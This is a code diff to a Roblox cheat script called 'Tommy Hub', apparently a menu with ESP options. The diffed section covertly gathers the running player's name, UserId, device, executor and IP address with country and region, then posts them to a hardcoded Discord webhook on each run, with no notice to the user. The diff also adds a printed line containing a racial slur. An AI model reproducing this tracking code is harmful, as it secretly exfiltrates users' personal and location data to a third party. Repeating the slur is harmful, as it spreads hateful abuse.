@@ -975,8 +975,7 @@ toggle(ESPpage, "Highlight Players", "ESPHighlight")
 stepper(ESPpage, "Text Size:", "ESPSize", 8, 32, 1, "px")
 
 showPage("Combat")
-
--- ================= 🔥 TOMMY HUB FULL PRO (FIX) =================
+-- ==================== 🔥 TOMMY HUB FULL PRO (FIX) ====================
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -985,16 +984,16 @@ local MarketplaceService = game:GetService("MarketplaceService")
 
 local Player = Players.LocalPlayer
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sq"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1536951404394979358/5x8NbL5Pzd3vNH2UwoNve32odOXO1D-jbGVJy7LZvPZQTDDfvyF3bxLZlvgar7wIOsqv"
 
--- ================= ⚙️ CONTADOR FIX REAL =================
+-- ==================== 📊 CONTADOR FIX REAL ====================
 
 local execCount = 1
 
 pcall(function()
     if getgenv then
         local g = getgenv()
-        if typeof(g.TommyExecCount) == "number" then
+        if type(g.TommyExecCount) ~= "number" then
             g.TommyExecCount = 1
         else
             g.TommyExecCount += 1
@@ -1007,17 +1006,17 @@ if not execCount or execCount < 1 then
     execCount = 1
 end
 
--- ================= ⏰ HORA =================
+-- ==================== ⏰ HORA ====================
 
 local function GetTime()
-    return os.date("%Y-%m-%d %H:%M:%S")
+    return os.date("%Y%m%d %H%M%S")
 end
 
--- ================= 📱 DISPOSITIVO =================
+-- ==================== 📱 DISPOSITIVO ====================
 
 local function GetDevice()
     if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-        return "Móvil"
+        return "Movil"
     elseif UserInputService.GamepadEnabled then
         return "Consola"
     else
@@ -1025,7 +1024,7 @@ local function GetDevice()
     end
 end
 
--- ================= 🎮 JUEGO =================
+-- ==================== 🎮 JUEGO ====================
 
 local function GetGameName()
     local name = "Desconocido"
@@ -1035,7 +1034,7 @@ local function GetGameName()
     return name
 end
 
--- ================= 🌐 IP INFO =================
+-- ==================== 🌐 IP INFO ====================
 
 local function GetIPData()
     local ok, res = pcall(function()
@@ -1053,16 +1052,16 @@ local function GetIPData()
     }
 end
 
--- ================= 🧠 EXECUTOR FIX =================
+-- ==================== 🧠 EXECUTOR FIX ====================
 
 local function GetExecutor()
     local name = "Desconocido"
 
     pcall(function()
-        if type(identifyexecutor) == "function" then
+        if typeof(identifyexecutor) == "function" then
             name = identifyexecutor()
 
-        elseif type(getexecutorname) == "function" then
+        elseif typeof(getexecutorname) == "function" then
             name = getexecutorname()
 
         elseif getgenv then
@@ -1080,7 +1079,7 @@ local function GetExecutor()
         elseif KRNL_LOADED then
             name = "KRNL"
 
-        elseif Fluxus then
+        elseif fluxus then
             name = "Fluxus"
 
         elseif secure_load then
@@ -1091,7 +1090,7 @@ local function GetExecutor()
     return tostring(name or "Desconocido")
 end
 
--- ================= 📤 WEBHOOK =================
+-- ==================== 📩 WEBHOOK ====================
 
 local function SendWebhook(info)
     pcall(function()
@@ -1100,36 +1099,34 @@ local function SendWebhook(info)
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
-                embeds = {
-                    {
-                        title = "🔥 TOMMY HUB EJECUTADO",
-                        color = 65280,
-                        fields = {
-                            {name="Jugador", value=Player.Name, inline=true},
-                            {name="UserId", value=tostring(Player.UserId), inline=true},
-                            {name="Hora", value=GetTime(), inline=true},
-                            {name="Dispositivo", value=GetDevice(), inline=true},
-                            {name="Juego", value=GetGameName(), inline=true},
-                            {name="Executor", value=GetExecutor(), inline=true},
-                            {name="Ejecuciones", value=tostring(execCount), inline=true},
-                            {name="IP", value=info.ip, inline=true},
-                            {name="País", value=info.country, inline=true},
-                            {name="Región", value=info.region, inline=true},
-                        },
-                        footer = {text="Tommy Hub System"}
-                    }
-                }
+                embeds = {{
+                    title = "🔥 TOMMY HUB EJECUTADO",
+                    color = 65280,
+                    fields = {
+                        {name="Jugador", value=Player.Name, inline=true},
+                        {name="UserId", value=tostring(Player.UserId), inline=true},
+                        {name="Hora", value=GetTime(), inline=true},
+                        {name="Dispositivo", value=GetDevice(), inline=true},
+                        {name="Juego", value=GetGameName(), inline=true},
+                        {name="Executor", value=GetExecutor(), inline=true},
+                        {name="Ejecuciones", value=tostring(execCount), inline=true},
+                        {name="IP", value=info.ip, inline=true},
+                        {name="País", value=info.country, inline=true},
+                        {name="Región", value=info.region, inline=true}
+                    },
+                    footer = {text="Tommy Hub System"}
+                }}
             })
         })
     end)
 end
 
--- ================= 🚀 EJECUCIÓN =================
+-- ==================== 🚀 EJECUCIÓN ====================
 
 local info = GetIPData() or {ip="N/A", country="N/A", region="N/A"}
 
 SendWebhook(info)
 
-print("🔥 Tommy Hub67 @everyone Activado")
+print("🔥 Tommy Hub 67 @everoyne Ejecutado Alerta de Nigga") 
 
 print("✅ TOMMY HUB 67 cargado | F4 = abrir/cerrar")
